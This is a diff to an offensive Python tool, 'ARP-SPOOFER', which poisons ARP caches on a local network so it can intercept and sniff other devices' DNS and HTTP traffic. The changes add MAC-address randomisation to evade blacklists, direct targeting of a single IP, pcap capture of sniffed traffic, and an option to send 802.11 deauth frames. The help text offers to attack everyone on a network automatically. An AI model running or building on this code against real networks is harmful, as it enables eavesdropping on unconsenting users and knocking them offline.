@@ -38,13 +38,14 @@ import atexit
 import logging
 import warnings
 import ctypes
+import traceback
 from ctypes import wintypes
 import urllib.request
 import urllib.error
 import urllib.parse
 from datetime import datetime
 from dataclasses import dataclass
-from typing import Optional
+from typing import Optional, List, Dict, Tuple
 from colorama import Fore, Style, init
 
 if os.name == "nt":
@@ -69,9 +70,18 @@ _session_logger: Optional["SessionLogger"] = None
 
 title = "ARP-SPOOFER - LTX & Moka"
 
+def _excepthook(exc_type, exc_value, exc_traceback):
+    if issubclass(exc_type, KeyboardInterrupt):
+        safe_print(f"\n\n{Fore.LIGHTCYAN_EX}[*] Stopped by user. Exiting cleanly.")
+        sys.exit(0)
+    else:
+        traceback.print_exception(exc_type, exc_value, exc_traceback)
+
+sys.excepthook = _excepthook
+
+RE_IPV4 = re.compile(r"\d+\.\d+\.\d+\.\d+")
 
 def set_console_title(text: str) -> None:
-    """Set console title without cmd.exe (safe with '&' and special chars)."""
     if os.name == "nt":
         try:
             ctypes.windll.kernel32.SetConsoleTitleW(str(text))
@@ -80,19 +90,17 @@ def set_console_title(text: str) -> None:
     else:
         sys.stdout.write(f"\x1b]2;{text}\x07")
 
-
 def clear_console() -> None:
     if os.name == "nt":
         subprocess.run("cls", shell=True, check=False)
     else:
         subprocess.run(["clear"], check=False)
 
-
 set_console_title(os.environ.get("ARP_SPOOFER_WINDOW_TITLE", title))
 
 CHECK_INTERVAL = 30
-TARGET_REFRESH_INTERVAL = 300
-TARGET_MAC_REFRESH_INTERVAL = 180
+TARGET_REFRESH_INTERVAL = 60
+TARGET_MAC_REFRESH_INTERVAL = 75
 SPOOF_INTERVAL = 2
 INTERNET_CHECK_TIMEOUT = 5
 INTERNET_CACHE_TTL = 15
@@ -114,7 +122,7 @@ class NetworkAdapter:
 
     @property
     def ip_range(self) -> str:
-        if not self.ip or not re.match(r"\d+\.\d+\.\d+\.\d+", self.ip):
+        if not self.ip or not RE_IPV4.match(self.ip):
             return ""
         try:
             if self.prefix and 0 < self.prefix <= 32:
@@ -122,7 +130,6 @@ class NetworkAdapter:
             return ".".join(self.ip.split(".")[:-1]) + ".0/24"
         except ValueError:
             return ".".join(self.ip.split(".")[:-1]) + ".0/24"
-
 
 VIRTUAL_ADAPTER_KEYWORDS = (
     "virtualbox", "vmware", "hyper-v", "vethernet", "loopback", "vpn",
@@ -178,8 +185,8 @@ def print_banner():
     lines = [
         " █████╗ ██████╗ ██████╗       ███████╗██████╗  ██████╗  ██████╗ ███████╗███████╗██████╗ ",
         "██╔══██╗██╔══██╗██╔══██╗      ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗",
-        "███████║██████╔╝██████╔╝█████╗███████╗██████╔╝██║   ██║██║   ██║█████╗  █████╗  ██████╔╝",
-        "██╔══██║██╔══██╗██╔═══╝ ╚════╝╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██╔══╝  ██╔══██╗",
+        "███████║██████╔╝██████╔╝█████╗███████║██████╔╝██║   ██║██║   ██║█████╗  █████╗  ██████╔╝",
+        "██╔══██║██╔══██║██╔═══╝ ╚════╝╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██╔══╝  ██╔══██╗",
         "██║  ██║██║  ██║██║           ███████║██║     ╚██████╔╝╚██████╔╝██║     ███████╗██║  ██║",
         "╚═╝  ╚═╝╚═╝  ╚═╝╚═╝           ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝",
     ]
@@ -276,7 +283,7 @@ def _linux_iface_gateway(name: str) -> str:
     return ""
 
 
-def _get_linux_network_adapters(include_down: bool = False) -> list[NetworkAdapter]:
+def _get_linux_network_adapters(include_down: bool = False) -> List[NetworkAdapter]:
     ok, link_out = run_cmd("ip -j link show")
     ok2, addr_out = run_cmd("ip -j -4 addr show")
     if not ok or not ok2 or not link_out.strip() or not addr_out.strip():
@@ -288,7 +295,7 @@ def _get_linux_network_adapters(include_down: bool = False) -> list[NetworkAdapt
     except json.JSONDecodeError:
         return []
 
-    addr_by_iface: dict[str, tuple[str, int]] = {}
+    addr_by_iface: Dict[str, Tuple[str, int]] = {}
     for entry in addrs:
         ifname = str(entry.get("ifname", "") or "")
         for info in entry.get("addr_info", []):
@@ -300,7 +307,7 @@ def _get_linux_network_adapters(include_down: bool = False) -> list[NetworkAdapt
             prefix = int(info.get("prefixlen", 24) or 24)
             addr_by_iface[ifname] = (ip, prefix)
 
-    adapters: list[NetworkAdapter] = []
+    adapters: List[NetworkAdapter] = []
     idx = 1
     for link in links:
         name = str(link.get("ifname", "") or "").strip()
@@ -331,7 +338,7 @@ def _get_linux_network_adapters(include_down: bool = False) -> list[NetworkAdapt
     return adapters
 
 
-def _get_windows_network_adapters(include_down: bool = False) -> list[NetworkAdapter]:
+def _get_windows_network_adapters(include_down: bool = False) -> List[NetworkAdapter]:
     status_filter = "" if include_down else "| Where-Object { $_.Status -eq 'Up' }"
     ps = (
         f"$rows = @(); Get-NetAdapter {status_filter} | ForEach-Object {{ "
@@ -371,7 +378,7 @@ def _get_windows_network_adapters(include_down: bool = False) -> list[NetworkAda
             continue
         ip = str(row.get("IP", "") or "").strip()
         gateway = str(row.get("Gateway", "") or "").strip()
-        if gateway and not re.match(r"\d+\.\d+\.\d+\.\d+", gateway):
+        if gateway and not RE_IPV4.match(gateway):
             gateway = ""
         adapters.append(
             NetworkAdapter(
@@ -390,13 +397,13 @@ def _get_windows_network_adapters(include_down: bool = False) -> list[NetworkAda
     return adapters
 
 
-def get_network_adapters(include_down: bool = False) -> list[NetworkAdapter]:
+def get_network_adapters(include_down: bool = False) -> List[NetworkAdapter]:
     if os.name == "nt":
         return _get_windows_network_adapters(include_down)
     return _get_linux_network_adapters(include_down)
 
 
-def display_network_adapters(adapters: list[NetworkAdapter]):
+def display_network_adapters(adapters: List[NetworkAdapter]):
     if not adapters:
         log_warn("No network adapters found.")
         return
@@ -417,7 +424,7 @@ def display_network_adapters(adapters: list[NetworkAdapter]):
     safe_print(f"{Fore.WHITE}+{'-' * 4}+{'-' * 22}+{'-' * 14}+{'-' * 16}+{'-' * 16}+{'-' * 16}+")
 
 
-def pick_network_adapter(adapters: list[NetworkAdapter], choice: Optional[str]) -> Optional[NetworkAdapter]:
+def pick_network_adapter(adapters: List[NetworkAdapter], choice: Optional[str]) -> Optional[NetworkAdapter]:
     if not adapters:
         return None
     if choice is None or choice == "__interactive__":
@@ -444,19 +451,66 @@ def get_best_adapter() -> Optional[NetworkAdapter]:
         return None
 
     def score(a: NetworkAdapter) -> tuple:
-        has_ip = 1 if a.ip and re.match(r"\d+\.\d+\.\d+\.\d+", a.ip) else 0
-        has_gw = 1 if a.gateway and re.match(r"\d+\.\d+\.\d+\.\d+", a.gateway) else 0
+        has_ip = 1 if a.ip and RE_IPV4.match(a.ip) else 0
+        has_gw = 1 if a.gateway and RE_IPV4.match(a.gateway) else 0
         type_bonus = 1 if a.adapter_type in ("WiFi", "Ethernet") else 0
         return (has_gw, has_ip, type_bonus)
 
     return max(adapters, key=score)
 
 
-def prompt_manual_network() -> tuple[str, str]:
+def prompt_manual_network() -> Tuple[str, str]:
     log_info("Manual mode - enter network settings.")
     ip_range = input(f"{Fore.WHITE}[?] Network range (e.g. 192.168.1.0/24): ").strip()
     gateway = input(f"{Fore.WHITE}[?] Gateway IP (e.g. 192.168.1.1): ").strip()
     return ip_range, gateway
+
+
+def apply_spoofed_mac(iface_name: str) -> bool:
+    if not iface_name:
+        log_err("No interface specified for MAC spoofing.")
+        return False
+
+    new_mac = "02" + "".join(f"{random.randint(0, 255):02x}" for _ in range(5))
+    log_info(f"Attempting to change MAC on {iface_name} -> {new_mac}")
+    
+    if os.name == "nt":
+        run_cmd(f'netsh interface set interface name="{iface_name}" admin=disable')
+        time.sleep(2)
+        reg_path = r"HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}"
+        ok, out = run_cmd(
+            f'powershell -Command "Get-ChildItem {reg_path} -ErrorAction SilentlyContinue | '
+            f'ForEach-Object {{ $p = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue; '
+            f'if ($p.NetCfgInstanceId -and (Get-NetAdapter -InterfaceGuid $p.NetCfgInstanceId '
+            f'-ErrorAction SilentlyContinue).Name -eq \'{iface_name}\') '
+            f'{{ Set-ItemProperty -Path $_.PSPath -Name NetworkAddress -Value \'{new_mac.replace(":", "")}\'; '
+            f'Write-Output OK }} }}"'
+        )
+        run_cmd(f'netsh interface set interface name="{iface_name}" admin=enable')
+        time.sleep(5)
+        if ok and "OK" in out:
+            log_ok(f"MAC changed to {new_mac}. Renewing DHCP...")
+            run_cmd(f'netsh interface ip set address name="{iface_name}" source=dhcp')
+            run_cmd("ipconfig /release")
+            time.sleep(1)
+            run_cmd("ipconfig /renew")
+            run_cmd("ipconfig /flushdns")
+            return True
+        log_err("Failed to spoof MAC address.")
+        return False
+
+    run_cmd(f"ip link set {iface_name} down")
+    time.sleep(1)
+    ok, _ = run_cmd(f"ip link set {iface_name} address {new_mac}")
+    run_cmd(f"ip link set {iface_name} up")
+    time.sleep(5)
+    if ok:
+        log_ok(f"MAC changed to {new_mac}. Renewing DHCP...")
+        run_cmd(f"dhclient -r {iface_name} 2>/dev/null")
+        run_cmd(f"dhclient {iface_name} 2>/dev/null")
+        return True
+    log_err("Failed to spoof MAC address.")
+    return False
 
 
 def configure_network(args) -> Optional[NetworkAdapter]:
@@ -476,7 +530,7 @@ def configure_network(args) -> Optional[NetworkAdapter]:
         if not args.ip_range or not args.gateway:
             log_err("Manual mode requires -r and -g (network range and gateway).")
             sys.exit(1)
-        if not re.match(r"\d+\.\d+\.\d+\.\d+", args.gateway):
+        if not RE_IPV4.match(args.gateway):
             log_err("Invalid gateway IP.")
             sys.exit(1)
         if selected:
@@ -521,7 +575,7 @@ def configure_network(args) -> Optional[NetworkAdapter]:
         log_err("Could not detect network. Use --manual with -r/-g or -i to select an adapter.")
         sys.exit(1)
 
-    if args.ip_range == "UNKNOWN" or not re.match(r"\d+\.\d+\.\d+\.\d+", args.gateway):
+    if args.ip_range == "UNKNOWN" or not RE_IPV4.match(args.gateway):
         log_err("Invalid network configuration detected.")
         sys.exit(1)
 
@@ -548,7 +602,6 @@ def run_cmd(cmd, timeout=30, encoding=None):
 
 
 def run_netsh(cmd, timeout=30):
-    """netsh on French Windows outputs UTF-8 (NBSP before colons)."""
     ok, out = run_cmd(cmd, timeout=timeout, encoding="utf-8")
     if out.strip():
         return ok, out
@@ -566,25 +619,25 @@ def extract_wifi_profile_ssid(line: str) -> Optional[str]:
 
 
 def log_info(msg):
-    safe_print(f"{Fore.LIGHTCYAN_EX}[*] {msg}")
+    safe_print(f"\033[K{Fore.LIGHTCYAN_EX}[*] {msg}")
     if _session_logger:
         _session_logger.write("INFO", msg)
 
 
 def log_ok(msg):
-    safe_print(f"{Fore.GREEN}[+] {msg}")
+    safe_print(f"\033[K{Fore.GREEN}[+] {msg}")
     if _session_logger:
         _session_logger.write("OK", msg)
 
 
 def log_warn(msg):
-    safe_print(f"{Fore.YELLOW}[!] {msg}")
+    safe_print(f"\033[K{Fore.YELLOW}[!] {msg}")
     if _session_logger:
         _session_logger.write("WARN", msg)
 
 
 def log_err(msg):
-    safe_print(f"{Fore.RED}[-] {msg}")
+    safe_print(f"\033[K{Fore.RED}[-] {msg}")
     if _session_logger:
         _session_logger.write("ERROR", msg)
 
@@ -608,14 +661,12 @@ class SessionLogger:
 
 
 def pause_console(message: str = "\nPress Enter to continue..."):
-    """Keep the console open so scan output can be read (especially after UAC relaunch)."""
     try:
         if sys.stdin.isatty():
             input(message)
             return
     except (EOFError, KeyboardInterrupt):
         pass
-
     if os.name == "nt":
         try:
             os.system("pause")
@@ -627,14 +678,12 @@ def check_admin_windows() -> bool:
     if os.name != "nt":
         return os.geteuid() == 0
     try:
-        import ctypes
         return bool(ctypes.windll.shell32.IsUserAnAdmin())
     except Exception:
         return False
 
 
 def request_admin_elevation() -> None:
-    """Request elevated privileges (UAC on Windows, sudo on Linux)."""
     if "--no-elevate" in sys.argv:
         return
     if "-h" in sys.argv or "--help" in sys.argv:
@@ -683,7 +732,7 @@ def request_admin_elevation() -> None:
     sys.exit(0)
 
 
-def export_scan_results(devices: list[dict], output_path: str):
+def export_scan_results(devices: List[dict], output_path: str):
     try:
         os.makedirs(os.path.dirname(os.path.abspath(output_path)) or ".", exist_ok=True)
     except OSError:
@@ -701,7 +750,7 @@ def export_scan_results(devices: list[dict], output_path: str):
     log_ok(f"Scan exported to {output_path}")
 
 
-def export_wifi_results(networks: list[WifiNetwork], output_path: str):
+def export_wifi_results(networks: List[WifiNetwork], output_path: str):
     try:
         os.makedirs(os.path.dirname(os.path.abspath(output_path)) or ".", exist_ok=True)
     except OSError:
@@ -731,7 +780,7 @@ def export_wifi_results(networks: list[WifiNetwork], output_path: str):
                 )
     log_ok(f"WiFi scan exported to {output_path}")
 
-# Windows wlanapi ctypes structures (module-level for cross-references)
+
 class _WLAN_GUID(ctypes.Structure):
     _fields_ = [
         ("Data1", wintypes.DWORD),
@@ -740,20 +789,17 @@ class _WLAN_GUID(ctypes.Structure):
         ("Data4", wintypes.BYTE * 8),
     ]
 
-
 class _DOT11_SSID(ctypes.Structure):
     _fields_ = [
         ("SSIDLength", wintypes.ULONG),
         ("SSID", wintypes.BYTE * 32),
     ]
 
-
 class _WLAN_RATE_SET(ctypes.Structure):
     _fields_ = [
         ("uRateSetLength", wintypes.ULONG),
         ("usRateSet", wintypes.USHORT * 126),
     ]
-
 
 class _WLAN_BSS_ENTRY(ctypes.Structure):
     _fields_ = [
@@ -775,13 +821,11 @@ class _WLAN_BSS_ENTRY(ctypes.Structure):
         ("ulIeSize", wintypes.ULONG),
     ]
 
-
 class _WLAN_BSS_LIST(ctypes.Structure):
     _fields_ = [
         ("dwTotalSize", wintypes.DWORD),
         ("dwNumberOfItems", wintypes.DWORD),
     ]
-
 
 class _WLAN_INTERFACE_INFO(ctypes.Structure):
     _fields_ = [
@@ -790,13 +834,11 @@ class _WLAN_INTERFACE_INFO(ctypes.Structure):
         ("isState", wintypes.DWORD),
     ]
 
-
 class _WLAN_INTERFACE_INFO_LIST(ctypes.Structure):
     _fields_ = [
         ("dwNumberOfItems", wintypes.DWORD),
         ("dwIndex", wintypes.DWORD),
     ]
-
 
 class _WLAN_AVAILABLE_NETWORK(ctypes.Structure):
     _fields_ = [
@@ -817,7 +859,6 @@ class _WLAN_AVAILABLE_NETWORK(ctypes.Structure):
         ("dwReserved", wintypes.DWORD),
     ]
 
-
 class _WLAN_AVAILABLE_NETWORK_LIST(ctypes.Structure):
     _fields_ = [
         ("dwNumberOfItems", wintypes.DWORD),
@@ -826,8 +867,6 @@ class _WLAN_AVAILABLE_NETWORK_LIST(ctypes.Structure):
 
 
 class NativeWifiScanner:
-    """Scan nearby WiFi networks via Windows wlanapi.dll (live radio scan)."""
-
     WLAN_CLIENT_VERSION = 2
     ERROR_SUCCESS = 0
     DOT11_BSS_TYPE_ANY = 3
@@ -856,7 +895,7 @@ class NativeWifiScanner:
     }
 
     @classmethod
-    def scan(cls) -> list["WifiNetwork"]:
+    def scan(cls) -> List[WifiNetwork]:
         if os.name != "nt":
             return []
         try:
@@ -876,7 +915,7 @@ class NativeWifiScanner:
         if result != cls.ERROR_SUCCESS:
             return []
 
-        networks: list[WifiNetwork] = []
+        networks: List[WifiNetwork] = []
         iface_list_ptr = ctypes.c_void_p()
         try:
             result = wlanapi.WlanEnumInterfaces(
@@ -980,7 +1019,7 @@ class NativeWifiScanner:
         wlanapi.WlanGetAvailableNetworkList.restype = wintypes.DWORD
 
     @staticmethod
-    def _dedupe_networks(networks: list["WifiNetwork"]) -> list["WifiNetwork"]:
+    def _dedupe_networks(networks: List[WifiNetwork]) -> List[WifiNetwork]:
         seen = set()
         unique = []
         for net in networks:
@@ -991,8 +1030,8 @@ class NativeWifiScanner:
         return unique
 
     @classmethod
-    def _read_available_networks(cls, wlanapi, client_handle, guid) -> dict[str, str]:
-        auth_map: dict[str, str] = {}
+    def _read_available_networks(cls, wlanapi, client_handle, guid) -> Dict[str, str]:
+        auth_map: Dict[str, str] = {}
         avail_ptr = ctypes.c_void_p()
         result = wlanapi.WlanGetAvailableNetworkList(
             client_handle,
@@ -1030,8 +1069,8 @@ class NativeWifiScanner:
         return auth_map
 
     @classmethod
-    def _parse_bss_list(cls, bss_ptr, auth_by_ssid: dict[str, str]) -> list["WifiNetwork"]:
-        results: list[WifiNetwork] = []
+    def _parse_bss_list(cls, bss_ptr, auth_by_ssid: Dict[str, str]) -> List[WifiNetwork]:
+        results: List[WifiNetwork] = []
         bss_list = ctypes.cast(bss_ptr, ctypes.POINTER(cls.WLAN_BSS_LIST)).contents
         base = ctypes.addressof(bss_list) + ctypes.sizeof(cls.WLAN_BSS_LIST)
         entry_size = ctypes.sizeof(cls.WLAN_BSS_ENTRY)
@@ -1070,8 +1109,6 @@ class NativeWifiScanner:
 
 
 class NetworkResilience:
-    """Cross-platform network detection, recovery and WiFi management."""
-
     CAPTIVE_KEYWORDS = (
         "accept", "agree", "connect", "login", "continue", "terms", "conditions",
         "submit", "authorize", "authorization", "get online", "click to", "consent",
@@ -1084,7 +1121,7 @@ class NetworkResilience:
         self._lock = threading.Lock()
         self._recovery_in_progress = False
         self._last_recovery = 0.0
-        self._internet_cache: tuple[bool, float] = (False, 0.0)
+        self._internet_cache: Tuple[bool, float] = (False, 0.0)
         self._recovery_count = 0
 
     def capture_initial_wifi(self):
@@ -1298,7 +1335,7 @@ class NetworkResilience:
             self._recovery_in_progress = False
             self._internet_cache = (False, 0.0)
 
-    def display_wifi_scan(self) -> list[WifiNetwork]:
+    def display_wifi_scan(self) -> List[WifiNetwork]:
         log_info("Scanning nearby WiFi networks (live radio scan)...")
         networks = self.scan_wifi_networks()
         if not networks:
@@ -1331,8 +1368,7 @@ class NetworkResilience:
         log_ok(f"Nearby WiFi scan: {len(unique)} network(s) found.")
         return unique
 
-    def scan_wifi_networks(self) -> list[WifiNetwork]:
-        """Scan nearby WiFi networks."""
+    def scan_wifi_networks(self) -> List[WifiNetwork]:
         if os.name == "nt":
             networks = NativeWifiScanner.scan()
             if networks:
@@ -1396,9 +1432,9 @@ class NetworkResilience:
                     return parts[0]
         return ""
 
-    def _scan_wifi_linux(self) -> list[WifiNetwork]:
-        networks: list[WifiNetwork] = []
-        seen: set[tuple[str, str]] = set()
+    def _scan_wifi_linux(self) -> List[WifiNetwork]:
+        networks: List[WifiNetwork] = []
+        seen: set[Tuple[str, str]] = set()
 
         ok, out = run_cmd("nmcli -t -f SSID,BSSID,SIGNAL,SECURITY device wifi list 2>/dev/null")
         if ok and out.strip():
@@ -1532,41 +1568,10 @@ class NetworkResilience:
         return self._linux_wifi_iface() or self.ctx.interface_name or self._get_active_interface()
 
     def _method_randomize_mac(self) -> bool:
-        """Rotate adapter MAC to evade IP/MAC blacklists."""
         iface = self.ctx.interface_name or self._get_active_interface()
         if not iface:
             return False
-        new_mac = "".join(f"{random.randint(0, 255):02x}" for _ in range(6))
-        new_mac = "02" + new_mac[2:]
-        log_info(f"Rotating MAC on {iface} -> {new_mac}")
-        if os.name == "nt":
-            run_cmd(f'netsh interface set interface name="{iface}" admin=disable')
-            time.sleep(2)
-            reg_path = r"HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}"
-            ok, out = run_cmd(
-                f'powershell -Command "Get-ChildItem {reg_path} -ErrorAction SilentlyContinue | '
-                f'ForEach-Object {{ $p = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue; '
-                f'if ($p.NetCfgInstanceId -and (Get-NetAdapter -InterfaceGuid $p.NetCfgInstanceId '
-                f'-ErrorAction SilentlyContinue).Name -eq \'{iface}\') '
-                f'{{ Set-ItemProperty -Path $_.PSPath -Name NetworkAddress -Value \'{new_mac.replace(":", "")}\'; '
-                f'Write-Output OK }} }}"'
-            )
-            run_cmd(f'netsh interface set interface name="{iface}" admin=enable')
-            time.sleep(5)
-            if ok and "OK" in out:
-                self._method_dhcp_renew()
-                return self.has_internet(use_cache=False)
-            return False
-
-        run_cmd(f"ip link set {iface} down")
-        time.sleep(1)
-        ok, _ = run_cmd(f"ip link set {iface} address {new_mac}")
-        run_cmd(f"ip link set {iface} up")
-        time.sleep(5)
-        if ok:
-            self._method_dhcp_renew()
-            return self.has_internet(use_cache=False)
-        return False
+        return apply_spoofed_mac(iface)
 
     def _method_dhcp_renew(self) -> bool:
         iface = self.ctx.interface_name or self._get_active_interface()
@@ -1671,7 +1676,7 @@ class NetworkResilience:
                     return True
         return False
 
-    def _rank_wifi_candidates(self, networks: list[WifiNetwork]) -> list[WifiNetwork]:
+    def _rank_wifi_candidates(self, networks: List[WifiNetwork]) -> List[WifiNetwork]:
         initial_ssid = self.initial_ctx.ssid.lower()
         initial_bssid_prefix = ""
         if self.initial_ctx.is_wifi:
@@ -1926,7 +1931,7 @@ class NetworkResilience:
         self.refresh_context()
         return bool(self.ctx.gateway and self.ctx.gateway_mac)
 
-    def _detect_network(self, interface_name: str = "") -> tuple[str, str, str]:
+    def _detect_network(self, interface_name: str = "") -> Tuple[str, str, str]:
         iface = interface_name or self.ctx.interface_name
         ip_address = ""
         gateway = ""
@@ -2093,7 +2098,7 @@ class NetworkResilience:
     def _parse_value(self, text: str, key: str) -> str:
         return parse_netsh_field(text, key)
 
-    def _parse_wifi_scan(self, output: str) -> list[WifiNetwork]:
+    def _parse_wifi_scan(self, output: str) -> List[WifiNetwork]:
         networks = []
         current_ssid = ""
         current_auth = ""
@@ -2138,17 +2143,25 @@ def get_arguments():
   {Fore.WHITE}python arp_spoofer.py --scan -o devices.json
   {Fore.WHITE}python arp_spoofer.py --scan-wifi
   {Fore.WHITE}python arp_spoofer.py --scan-wifi -o wifi.json
-  {Fore.WHITE}python arp_spoofer.py -a -s
+  {Fore.WHITE}python arp_spoofer.py -a -s --pcap capture.pcap
+  {Fore.WHITE}python arp_spoofer.py -a --whitelist 192.168.1.5,192.168.1.10
+  {Fore.WHITE}python arp_spoofer.py -a --spoof-mac
+  {Fore.WHITE}python arp_spoofer.py -a --deauth 192.168.1.50
+  {Fore.WHITE}python arp_spoofer.py -t 192.168.1.50 -s
   {Fore.WHITE}python arp_spoofer.py --manual -r 192.168.1.0/24 -g 192.168.1.1 -i
-  {Fore.WHITE}python arp_spoofer.py -i -a -s
-  {Fore.WHITE}python arp_spoofer.py -i 2 -a -s
 
 {Fore.LIGHTMAGENTA_EX}NOTES:
   - Use --scan to list devices on the current network and exit.
   - Use --scan-wifi to list available WiFi networks and exit.
   - Use -o/--output to export scan results (.json or .csv) for --scan and --scan-wifi.
   - Use -a to attack everyone on the network automatically.
+  - Use -t to target a specific IP without interactive prompt.
   - Use -s to enable the live DNS/HTTP traffic sniffer.
+  - Use --pcap to save all sniffed traffic to a file for offline analysis.
+  - Use --whitelist to exclude specific IPs from auto-targeting.
+  - Use --spoof-mac to randomize your MAC address before attack.
+  - Use --deauth to continuously send 802.11 deauth frames to a target IP.
+  - Use --interval to control spoofing speed (default: 2.0s).
   - Use -i to list and select a network adapter (WiFi / Ethernet).
   - Use --manual to disable auto-detect (requires -r and -g).
   - Auto-detects gateway/range from the selected or best adapter.
@@ -2157,59 +2170,24 @@ def get_arguments():
   - Linux: requests root via sudo when needed.
         """,
     )
-    parser.add_argument(
-        "--scan",
-        action="store_true",
-        help="Scan devices on the network and exit (standalone mode)",
-    )
-    parser.add_argument(
-        "--scan-wifi",
-        action="store_true",
-        help="Scan available WiFi networks and exit",
-    )
-    parser.add_argument(
-        "-o", "--output",
-        dest="output",
-        help="Export scan results to file (.json or .csv)",
-    )
-    parser.add_argument(
-        "--log",
-        dest="log_file",
-        help="Write session events to a log file",
-    )
-    parser.add_argument(
-        "-r", "--range", dest="ip_range", help="Network range (e.g. 192.168.1.0/24)"
-    )
+    parser.add_argument("--scan", action="store_true", help="Scan devices on the network and exit (standalone mode)")
+    parser.add_argument("--scan-wifi", action="store_true", help="Scan available WiFi networks and exit")
+    parser.add_argument("-o", "--output", dest="output", help="Export scan results to file (.json or .csv)")
+    parser.add_argument("--log", dest="log_file", help="Write session events to a log file")
+    parser.add_argument("-r", "--range", dest="ip_range", help="Network range (e.g. 192.168.1.0/24)")
     parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP address")
-    parser.add_argument(
-        "-a", "--all", action="store_true", help="Auto-target everyone (silent scan)"
-    )
-    parser.add_argument(
-        "-s", "--sniff", action="store_true", help="Enable live traffic sniffing (DNS/HTTP)"
-    )
-    parser.add_argument(
-        "-i", "--interface",
-        nargs="?",
-        const="__interactive__",
-        default=None,
-        metavar="N",
-        help="List network adapters and select one (optional index, e.g. -i 2)",
-    )
-    parser.add_argument(
-        "--manual",
-        action="store_true",
-        help="Manual mode: no auto-detect, requires -r and -g",
-    )
-    parser.add_argument(
-        "--no-recovery",
-        action="store_true",
-        help="Disable automatic internet/WiFi recovery",
-    )
-    parser.add_argument(
-        "--no-elevate",
-        action="store_true",
-        help="Skip automatic elevation (UAC on Windows, sudo on Linux)",
-    )
+    parser.add_argument("-a", "--all", action="store_true", help="Auto-target everyone (silent scan)")
+    parser.add_argument("-t", "--target", dest="target", help="Target a specific IP directly")
+    parser.add_argument("-s", "--sniff", action="store_true", help="Enable live traffic sniffing (DNS/HTTP)")
+    parser.add_argument("--pcap", dest="pcap", help="Save sniffed traffic to a PCAP file")
+    parser.add_argument("--whitelist", dest="whitelist", default="", help="Comma-separated IPs to exclude from auto-attack")
+    parser.add_argument("--spoof-mac", action="store_true", help="Randomize MAC address before starting")
+    parser.add_argument("--deauth", dest="deauth", metavar="IP", help="Send 802.11 deauth frames to a specific IP")
+    parser.add_argument("--interval", type=float, default=2.0, help="Spoofing interval in seconds (default: 2.0)")
+    parser.add_argument("-i", "--interface", nargs="?", const="__interactive__", default=None, metavar="N", help="List network adapters and select one (optional index, e.g. -i 2)")
+    parser.add_argument("--manual", action="store_true", help="Manual mode: no auto-detect, requires -r and -g")
+    parser.add_argument("--no-recovery", action="store_true", help="Disable automatic internet/WiFi recovery")
+    parser.add_argument("--no-elevate", action="store_true", help="Skip automatic elevation (UAC on Windows, sudo on Linux)")
     return parser.parse_args()
 
 
@@ -2219,9 +2197,7 @@ def get_mac(ip, retries=2):
             arp_request = scapy.ARP(pdst=ip)
             broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
             arp_request_broadcast = broadcast / arp_request
-            answered_list = scapy.srp(
-                arp_request_broadcast, timeout=2, verbose=False, retry=1
-            )[0]
+            answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False, retry=1)[0]
             if answered_list:
                 return answered_list[0][1].hwsrc
         except Exception:
@@ -2230,6 +2206,11 @@ def get_mac(ip, retries=2):
 
 
 def get_local_ip() -> str:
+    try:
+        if conf.iface:
+            return scapy.get_if_addr(conf.iface)
+    except Exception:
+        pass
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
             s.connect(("8.8.8.8", 80))
@@ -2242,11 +2223,9 @@ def silent_scan(ip_range):
     answered_list = scapy.srp(
         scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip_range),
         timeout=2,
-        verbose=False,
+        verbose=False
     )[0]
-    return [
-        {"ip": element[1].psrc, "mac": element[1].hwsrc} for element in answered_list
-    ]
+    return [{"ip": element[1].psrc, "mac": element[1].hwsrc} for element in answered_list]
 
 
 def visual_scan(ip_range):
@@ -2254,7 +2233,7 @@ def visual_scan(ip_range):
     answered_list = scapy.srp(
         scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip_range),
         timeout=3,
-        verbose=False,
+        verbose=False
     )[0]
     clients = []
 
@@ -2297,15 +2276,6 @@ def enable_ip_forwarding():
             pass
 
 
-def spoof(target_ip, target_mac, spoof_ip):
-    if not target_mac:
-        return
-    packet = scapy.Ether(dst=target_mac) / scapy.ARP(
-        op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip
-    )
-    scapy.sendp(packet, verbose=False)
-
-
 def restore(destination_ip, destination_mac, source_ip, source_mac):
     if not destination_mac or not source_mac:
         return
@@ -2339,7 +2309,7 @@ def _normalize_dns_name(qname) -> str:
     return text
 
 
-def _extract_dns_queries(packet) -> list[str]:
+def _extract_dns_queries(packet) -> List[str]:
     if not packet.haslayer(scapy.DNS):
         return []
     dns = packet[scapy.DNS]
@@ -2364,12 +2334,12 @@ def _extract_dns_queries(packet) -> list[str]:
 def process_packet(packet):
     try:
         for name in _extract_dns_queries(packet):
-            safe_print(f"\n{Fore.LIGHTMAGENTA_EX}[DNS LOG] {Fore.WHITE}{name}")
+            safe_print(f"\033[K\n{Fore.LIGHTMAGENTA_EX}[DNS LOG] {Fore.WHITE}{name}")
         if packet.haslayer(http.HTTPRequest):
             host = _decode_http_field(packet[http.HTTPRequest].Host)
             path = _decode_http_field(packet[http.HTTPRequest].Path) or "/"
             if host:
-                safe_print(f"\n{Fore.GREEN}[WEB LOG] {Fore.WHITE}{host}{path}")
+                safe_print(f"\033[K\n{Fore.GREEN}[WEB LOG] {Fore.WHITE}{host}{path}")
     except Exception:
         pass
 
@@ -2378,10 +2348,11 @@ class SpoofSession:
     def __init__(self, args, resilience: NetworkResilience):
         self.args = args
         self.resilience = resilience
-        self.targets: list[dict] = []
+        self.targets: List[dict] = []
         self.gateway_mac: Optional[str] = None
         self.gateway = args.gateway
         self.ip_range = args.ip_range
+        self.whitelist = set(ip.strip() for ip in args.whitelist.split(",") if ip.strip())
